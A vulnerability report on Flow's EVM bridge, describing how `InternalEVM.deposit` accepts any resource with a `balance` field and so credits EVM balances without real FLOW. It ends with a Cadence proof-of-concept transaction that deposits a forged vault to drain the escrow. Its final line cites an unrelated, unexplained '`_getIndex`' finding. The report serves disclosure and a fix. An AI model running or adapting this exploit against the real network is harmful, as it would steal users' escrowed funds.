### Title
Unvalidated Resource Type in `InternalEVM.deposit` Allows Arbitrary EVM Balance Inflation — (`fvm/evm/stdlib/contract.go` / `fvm/evm/impl/impl.go`)

### Summary

The `InternalEVM.deposit` function accepts `@AnyResource` as its `from` parameter instead of `@FlowToken.Vault`. The Go-level handler reads only the `balance: UFix64` field from whatever resource is passed and credits the EVM account with that amount — without verifying the resource is a genuine `FlowToken.Vault`. An unprivileged transaction sender can pass a crafted resource with an inflated `balance` field to mint arbitrary EVM FLOW balances, then withdraw real FLOW tokens from the bridge escrow.

---

### Finding Description

`InternalEVMTypeDepositFunctionType` is declared with the `from` parameter typed as `sema.AnyResourceType`:

```go
// fvm/evm/stdlib/contract.go lines 424–436
var InternalEVMTypeDepositFunctionType = &sema.FunctionType{
    Parameters: []sema.Parameter{
        {
            Label:          "from",
            TypeAnnotation: sema.NewTypeAnnotation(sema.AnyResourceType),  // ← accepts ANY resource
        },
        {
            Label:          "to",
            TypeAnnotation: sema.NewTypeAnnotation(EVMAddressBytesType),
        },
    },
    ReturnTypeAnnotation: sema.NewTypeAnnotation(sema.VoidType),
}
``` [1](#0-0) 

The Go handler `newInternalEVMTypeDepositFunction` then:
1. Casts the argument to `*interpreter.CompositeValue` (any composite resource)
2. Reads the `balance` field as `UFix64Value` — no type identity check
3. Constructs a `FLOWTokenVault` with that amount and calls `account.Deposit`

```go
// fvm/evm/impl/impl.go lines 643–679
fromValue, ok := invocation.Arguments[0].(*interpreter.CompositeValue)
// ...
amountValue, ok := fromValue.GetField(context, fungibleTokenVaultTypeBalanceFieldName).(interpreter.UFix64Value)
// ...
amount := types.NewBalanceFromUFix64(cadence.UFix64(amountValue.UFix64Value))
// ...
account.Deposit(types.NewFlowTokenVault(amount))
``` [2](#0-1) 

Critically, the handler intentionally does **not** destroy the passed resource:

```go
// NOTE: We're intentionally not destroying the vault here,
// because the value of it is supposed to be "kept alive".
``` [3](#0-2) 

The public-facing wrappers (`EVMAddress.deposit` and `CadenceOwnedAccount.deposit` in `contract.cdc`) both enforce `@FlowToken.Vault` at the Cadence level:

```cadence
// contract.cdc line 202
fun deposit(from: @FlowToken.Vault) { ... InternalEVM.deposit(from: <-from, ...) }
``` [4](#0-3) 

However, `InternalEVM` is a public contract with all members declared as `sema.NewUnmeteredPublicFunctionMember`, making `InternalEVM.deposit` directly callable from any user transaction or script — bypassing the typed wrappers entirely. [5](#0-4) 

---

### Impact Explanation

An attacker can:
1. Define a Cadence resource with a `balance: UFix64` field set to an arbitrarily large value (e.g., `1_000_000.0`)
2. Call `InternalEVM.deposit(from: <-fakeVault, to: attackerEVMAddress)` directly
3. The EVM account is credited with 1,000,000 FLOW in EVM state — with no real FLOW transferred to the escrow
4. The attacker then calls `CadenceOwnedAccount.withdraw(balance: ...)` to extract real FLOW tokens from the bridge escrow, draining funds deposited by legitimate users

This is a **bridge escrow mis-accounting** vulnerability: EVM balances are inflated without corresponding Cadence-side FLOW token deposits, allowing theft of real FLOW from the escrow pool.

**Impact: 8/10** — Direct theft of real FLOW tokens from the EVM bridge escrow.

---

### Likelihood Explanation

- `InternalEVM` is a public contract accessible from any Cadence transaction or script
- No privileged key, staked node, or admin access is required
- The attack requires only the ability to submit a Cadence transaction (any Flow account)
- The attacker needs to know the `InternalEVM.deposit` signature, which is publicly documented

**Likelihood: 7/10** — Straightforward to exploit by any Flow account holder.

---

### Recommendation

Change `InternalEVMTypeDepositFunctionType`'s `from` parameter from `sema.AnyResourceType` to the concrete `FlowToken.Vault` sema type (or at minimum `FungibleToken.Vault` interface type). Additionally, add a runtime type identity check in `newInternalEVMTypeDepositFunction` to verify the passed resource's type ID matches `FlowToken.Vault` before reading its `balance` field and crediting the EVM account.

---

### Proof of Concept

```cadence
import InternalEVM from <EVM_CONTRACT_ADDRESS>

// Step 1: Define a fake vault resource with an inflated balance
access(all) resource FakeVault {
    access(all) var balance: UFix64
    init() { self.balance = 1_000_000.0 }
}

transaction {
    prepare(signer: auth(Storage) &Account) {
        // Step 2: Create the fake vault
        let fake <- create FakeVault()

        // Step 3: Call InternalEVM.deposit directly — accepted because from: @AnyResource
        // Credits attacker's EVM address with 1,000,000 FLOW in EVM state
        InternalEVM.deposit(
            from: <-fake,
            to: [/* attacker's 20-byte EVM address */]
        )

        // Step 4: Attacker now has 1,000,000 FLOW in EVM; can withdraw real FLOW
        // from the bridge escrow via CadenceOwnedAccount.withdraw(...)
    }
}
```

The root cause is in `fvm/evm/stdlib/contract.go` (`InternalEVMTypeDepositFunctionType`, `sema.AnyResourceType`) and `fvm/evm/impl/impl.go` (`newInternalEVMTypeDepositFunction`, no type identity check), directly analogous to the reported `_getIndex` returning 0 for unknown tokens — here, any resource with a `balance` field silently passes as a valid FLOW vault.
